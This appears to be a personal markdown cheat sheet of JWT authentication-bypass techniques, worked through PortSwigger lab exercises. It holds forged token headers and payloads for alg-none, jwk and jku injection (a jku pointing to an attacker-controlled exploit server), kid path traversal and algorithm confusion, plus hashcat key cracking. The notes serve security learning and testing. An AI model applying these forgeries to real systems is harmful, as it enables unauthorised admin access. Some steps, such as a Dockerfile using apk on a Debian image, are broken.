# JWT

**Tools**
https://github.com/ticarpi/jwt_tool
```
cd /tmp
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
.
.
.
.

# or better
sudo docker run -it --network "host" --rm -v "${PWD}:/tmp" -v "${HOME}/.jwt_tool:/root/.jwt_tool" ticarpi/jwt_tool


```

Dockerfile:
```yml
FROM python:3.8-slim
WORKDIR /opt
COPY . /opt/jwt_tool
WORKDIR /opt/jwt_tool
RUN apk add gcc musl-dev
RUN python3 -m pip install -r requirements.txt
ENTRYPOINT ["python3","jwt_tool.py"]  
```

## JWT authentication bypass via unverified signature
Original request:
```json
HEADER:ALGORITHM & TOKEN TYPE
{
  "kid": "0ddc79bf-9b4c-489b-b683-b26434d9bf07",
  "alg": "RS256"
}

PAYLOAD:DATA
{
  "iss": "portswigger",
  "exp": 1739053856,
  "sub": "user"
}
```
Just modify the header or the payload data to check if the signature is being checking propierly:
```json
HEADER:ALGORITHM & TOKEN TYPE
{
  "kid": "0ddc79bf-9b4c-489b-b683-b26434d9bf07",
  "alg": "RS256"
}

PAYLOAD:DATA
{
  "iss": "portswigger",
  "exp": 1739053856,
  "sub": "administrator"
}
```

## JWT authentication bypass via flawed signature verification
Being the original token such as:
```json
HEADER:ALGORITHM & TOKEN TYPE
{
  "kid": "203a1210-66b9-4fd4-a0d8-334bf56c04d8",
  "alg": "RS256"
}

PAYLOAD:DATA
{
  "iss": "portswigger",
  "exp": 1739054809,
  "sub": "wiener"
}
```
**Checks**
- [ ] Modifify alg to none
- [ ] Remove the signature (But keep the last "." dot)
    - [ ] If request works properly just try to modify roles, users or whatever

```json
{
    "kid": "203a1210-66b9-4fd4-a0d8-334bf56c04d8",
    "alg": "none"
}

{
    "iss": "portswigger",
    "exp": 1739054809,
    "sub": "administrator"
}
```

## JWT authentication bypass via weak signing key
**Brute force the signing key**
```bash
wget https://raw.githubusercontent.com/wallarm/jwt-secrets/refs/heads/master/jwt.secrets.list

hashcat -a 0 -m 16500 jwt.txt jwt.secrets.list -D 1
# or
hashcat -a 0 -m 16500 eyJraWQiOiIwM2I1N2E5OC0yNTBhLTQzMzktOWUyNi04YWFkOGJjNTMzMjUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTczOTA1NjQzNywic3ViIjoid2llbmVyIn0.c2m3OG2q8xXJdz9YX8lst5ypMaGGtRNWGinYrLJqjjQ jwt.secrets.list
```

**Forging signing key**
1. Use https://jwt.io/

2. With Burp:
- JWT Editor Keys
- New Symmetric Key
- Generate .....


## JWT header parameter injections
**Vulnerability**
1. The attacker generates an RSA key pair (public key and private key).
2. They create a JWT with claims that grant them access (for example, "admin": true).
3. They sign the token with their private key.
4. In the JWT header, they include the jwk field with their public key.
5. The server, if it does not properly validate, uses the provided public key to verify the signature and accepts the token as valid.

**Explotation**
1. In Burp, load the JWT Editor extension from the BApp store.
2. In the lab, log in to your own account and send the post-login GET /my-account request to Burp Repeater.
3. In Burp Repeater, change the path to /admin and send the request. Observe that the admin panel is only accessible when logged in as the administrator user.
4. Go to the JWT Editor Keys tab in Burp's main tab bar.
5. Click New RSA Key.
6. In the dialog, click Generate to automatically generate a new key pair, then click OK to save the key. Note that you don't need to select a key size as this will automatically be updated later.
7. Go back to the GET /admin request in Burp Repeater and switch to the extension-generated JSON Web Token tab.
8. In the payload, change the value of the sub claim to administrator.
9. At the bottom of the JSON Web Token tab, click Attack, then select Embedded JWK. When prompted, select your newly generated RSA key and click OK.
10. In the header of the JWT, observe that a jwk parameter has been added containing your public key.
11. Send the request. Observe that you have successfully accessed the admin panel.
12. In the response, find the URL for deleting carlos (/admin/delete?username=carlos). Send the request to this endpoint to solve the lab.

**Original header**
```json
{
    "kid": "786c6187-8166-4181-9c67-2bd22d8487a5",
    "alg": "RS256"
}
```

**Modified header**
```json
{
    "kid": "d5992365-ee34-4c3c-a165-5bb033bc57d5",
    "typ": "JWT",
    "alg": "RS256",
    "jwk": {
        "kty": "RSA",
        "e": "AQAB",
        "kid": "d5992365-ee34-4c3c-a165-5bb033bc57d5",
        "n": "042f6ji1hgz2q-1BkajiOkZbdiGPuENwBVM7TP8bF_c9unV1MCDZhfWpCUgqV7fUxmo8RxFQarS13Rw1R3XS5HkLIKI4Olbihdot_5aYHPW-WPRtX7pcDqk6qj7HajznDbuHhLQRc9OvHFZOOruZWWGVL0X_1ZcUcLv05kmLMpqBsJE9GZnvPMD_Rgag_l6y8mNDMwIMkC3jEft-QQDJfHTN7pzVXu2wMVixR_4hOvQN59U0ovgmWjYHsjlEsrtPyoq5CCNsa1mcvmoa0QvzY1M6bXq8bUTQ5LH2mYnF6vWTbLgRUX1k1gTkrzfqFf2szIkr8IW9ceTiaYzs7BihHQ"
    }
}
```

The jwk (JSON Web Key) field in the header of a JWT is not part of the JWT standard, but some implementations allow its use to include a public key directly in the token. This can be used so that the token recipient knows which key to use to verify the JWT's signature.

Trust in untrusted sources: The application relies on information included in the token itself, such as the jwk or jku field.
Lack of strict validation: The origin of the JWK Set or the correspondence with previously trusted keys is not properly validated.
Incorrect configurations: JWT libraries are configured to dynamically accept external keys without restrictions.


## JWT authentication bypass via jku header injection
In Burp, load the JWT Editor extension from the BApp store.

In the lab, log in to your own account and send the post-login GET /my-account request to Burp Repeater.

In Burp Repeater, change the path to /admin and send the request. Observe that the admin panel is only accessible when logged in as the administrator user.

Go to the JWT Editor Keys tab in Burp's main tab bar.

**Click New RSA Key.**

In the dialog, click **Generate to automatically** generate a new key pair, then click OK to save the key. Note that you don't need to select a key size as this will automatically be updated later.

**Copy public key as JWK**

In a server that you controll upload the file keys
```json
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "7c6c931a-0081-48e2-b808-a3cadb043e3c",
            "n": "tQEb-OVEdEZbUjiJMmJcL8LwTbnPssuojrXs0NbM7roCzc5gqESg9v9eiz9_w2RRLVKrH5FLjtYNVYcMaCyVqHgHnoAzUZEWqmfAYE8rAPNNHAvFiw54yTOG4USRlSahkVWgLbgYOpCeSJJ6PBgIh5v3KUFv3g0rPM9aCiSd0EqPxT5fCVLki_MHJMYvuWJ3gMPjETTM60m6yjFVMZlLEZNgltqiIc5ruBuyp5qwH85yGPbWiZydA81DZLcyRETf7UehAACOM3iP0yjJnfJiYVBUh32Mxku1bS_uDQ6j8BMs4UXXaDMr9hknfdZo7syppQpUGvB68jq2QTLOfUgRpw"
        }
    ]
}
```
Modify the **kid** with the kid in the public key before copied and add to the jwt header the url of your malicious server as next:
```json
{
    "kid": "7c6c931a-0081-48e2-b808-a3cadb043e3c",
    "alg": "RS256",
    "jku": "https://exploit-0a0d00b3037fbf60800adedc01ab005f.exploit-server.net/exploit"
}
```
At last **modify the payload bodies (sub or any parameter)** as you need and **Sign the the token with the key generated**

Final JWT
```json
# header
{
    "kid": "7c6c931a-0081-48e2-b808-a3cadb043e3c",
    "alg": "RS256",
    "jku": "https://exploit-0a0d00b3037fbf60800adedc01ab005f.exploit-server.net/exploit"
}

# bodfy
{
    "iss": "portswigger",
    "exp": 1739063363,
    "sub": "administrator"
}
```

## JWT Authentication bypass via kid header path traversal
El scope de este ataque no se limita al uso de claves simétricas pero es lo más común.
```

```

Go to the JWT Editor Keys tab in Burp's main tab bar.

Click New Symmetric Key.

In the dialog, click Generate to generate a new key in JWK format. Note that you don't need to select a key size as this will automatically be updated later.

Replace the generated value for the k property with a Base64-encoded null byte (AA==). Note that this is just a workaround because the JWT Editor extension won't allow you to sign tokens using an empty string.
```json
{
    "kty": "oct",
    "kid": "5720786f-448c-42a3-bf17-ef2d5daf9497",
    "k": "AA="
}
```

Modify the JWT token with:
```json
# header
{
    "kid": "../../../../../../../../../dev/null",
    "alg": "HS256"
}

# body
{
    "iss": "portswigger",
    "exp": 1739065023,
    "sub": "administrator"
}
```
**Sign the token with the key generated** (the one with k = "AA=")

You should access to the forbidden place!



## JWT authentication bypass via algorithm confusion
Assume that you have access to the file that contain the public keys to sign (or check) the tokens:
```
https://0a71001404f06dca811e1175009d0099.web-security-academy.net/jwks.json

{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "use": "sig",
      "kid": "7b3fc0b4-444a-4189-9445-b9ef9e0c5677",
      "alg": "RS256",
      "n": "msh6Y1aPp5PGpP762qO5N149x5FpTYoEea8rCv0uuRNaj0ZVrQ4nMccFpCYhLldFniPlc1nm_PLmAQEw6WNsChC4eWvhFum1jMSdW-dK8eOFyUDsH6qAsi2dp9Y-xpF3TWs6m8vZnEOjWekkBZ_f8v0IG644stQFl47xbGmAewkGJ5-BKSf-RUiNNy8eSy3RH4RCCbMPKfGyB3s4n26OrjAE61LTtoBiJ0P38tJMandVkKuVV8T0ASawNet3A3Y9Jk3gKTp1EF5PPcoltibONrEuCsHDVLElEZM95KHiYddytdFGOBMqjtVqMrSy6xM6XsdpGhmSECULKFqxRPgrbQ"
    }
  ]
}

e + n = public key
"use": "sig", -> Use to sign or check the keys
```
**the server exposes a JWK Set containing a single public key.**

1. Copy the JWK object from inside the keys array. Make sure that you don't accidentally copy any characters from the surrounding array.
```
    {
      "kty": "RSA",
      "e": "AQAB",
      "use": "sig",
      "kid": "7b3fc0b4-444a-4189-9445-b9ef9e0c5677",
      "alg": "RS256",
      "n": "msh6Y1aPp5PGpP762qO5N149x5FpTYoEea8rCv0uuRNaj0ZVrQ4nMccFpCYhLldFniPlc1nm_PLmAQEw6WNsChC4eWvhFum1jMSdW-dK8eOFyUDsH6qAsi2dp9Y-xpF3TWs6m8vZnEOjWekkBZ_f8v0IG644stQFl47xbGmAewkGJ5-BKSf-RUiNNy8eSy3RH4RCCbMPKfGyB3s4n26OrjAE61LTtoBiJ0P38tJMandVkKuVV8T0ASawNet3A3Y9Jk3gKTp1EF5PPcoltibONrEuCsHDVLElEZM95KHiYddytdFGOBMqjtVqMrSy6xM6XsdpGhmSECULKFqxRPgrbQ"
    }
```
2. JWT Editor Keys -> New RSA Key -> JWK selected -> OK to save the key
3. Copy Public Key as PEM, you will copy something like:
```json
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmsh6Y1aPp5PGpP762qO5
N149x5FpTYoEea8rCv0uuRNaj0ZVrQ4nMccFpCYhLldFniPlc1nm/PLmAQEw6WNs
ChC4eWvhFum1jMSdW+dK8eOFyUDsH6qAsi2dp9Y+xpF3TWs6m8vZnEOjWekkBZ/f
8v0IG644stQFl47xbGmAewkGJ5+BKSf+RUiNNy8eSy3RH4RCCbMPKfGyB3s4n26O
rjAE61LTtoBiJ0P38tJMandVkKuVV8T0ASawNet3A3Y9Jk3gKTp1EF5PPcoltibO
NrEuCsHDVLElEZM95KHiYddytdFGOBMqjtVqMrSy6xM6XsdpGhmSECULKFqxRPgr
bQIDAQAB
-----END PUBLIC KEY-----
```
4. Decoder and encode this content copied into b64
```
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFtc2g2WTFhUHA1UEdwUDc2MnFPNQpOMTQ5eDVGcFRZb0VlYThyQ3YwdXVSTmFqMFpWclE0bk1jY0ZwQ1loTGxkRm5pUGxjMW5tL1BMbUFRRXc2V05zCkNoQzRlV3ZoRnVtMWpNU2RXK2RLOGVPRnlVRHNINnFBc2kyZHA5WSt4cEYzVFdzNm04dlpuRU9qV2Vra0JaL2YKOHYwSUc2NDRzdFFGbDQ3eGJHbUFld2tHSjUrQktTZitSVWlOTnk4ZVN5M1JINFJDQ2JNUEtmR3lCM3M0bjI2TwpyakFFNjFMVHRvQmlKMFAzOHRKTWFuZFZrS3VWVjhUMEFTYXdOZXQzQTNZOUprM2dLVHAxRUY1UFBjb2x0aWJPCk5yRXVDc0hEVkxFbEVaTTk1S0hpWWRkeXRkRkdPQk1xanRWcU1yU3k2eE02WHNkcEdobVNFQ1VMS0ZxeFJQZ3IKYlFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
```
5. JWT Editor Keys -> New Simmetric Key -> Generate -> Modify the content of "k" parameter for the b64 encoded of the Publick key copied as PEM.
```json
{
    "kty": "oct",
    "kid": "f26ceacf-4b71-4ce7-ae09-ca1957914f1f",
    "k": "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFtc2g2WTFhUHA1UEdwUDc2MnFPNQpOMTQ5eDVGcFRZb0VlYThyQ3YwdXVSTmFqMFpWclE0bk1jY0ZwQ1loTGxkRm5pUGxjMW5tL1BMbUFRRXc2V05zCkNoQzRlV3ZoRnVtMWpNU2RXK2RLOGVPRnlVRHNINnFBc2kyZHA5WSt4cEYzVFdzNm04dlpuRU9qV2Vra0JaL2YKOHYwSUc2NDRzdFFGbDQ3eGJHbUFld2tHSjUrQktTZitSVWlOTnk4ZVN5M1JINFJDQ2JNUEtmR3lCM3M0bjI2TwpyakFFNjFMVHRvQmlKMFAzOHRKTWFuZFZrS3VWVjhUMEFTYXdOZXQzQTNZOUprM2dLVHAxRUY1UFBjb2x0aWJPCk5yRXVDc0hEVkxFbEVaTTk1S0hpWWRkeXRkRkdPQk1xanRWcU1yU3k2eE02WHNkcEdobVNFQ1VMS0ZxeFJQZ3IKYlFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg=="
}
```
6. After create return to the repeater, modify:
    - The header: alg parameter to HS256
    - The body ("sub": "administrator") 
    - and sign with the simmetric key generated.
7. Pray and check if it works


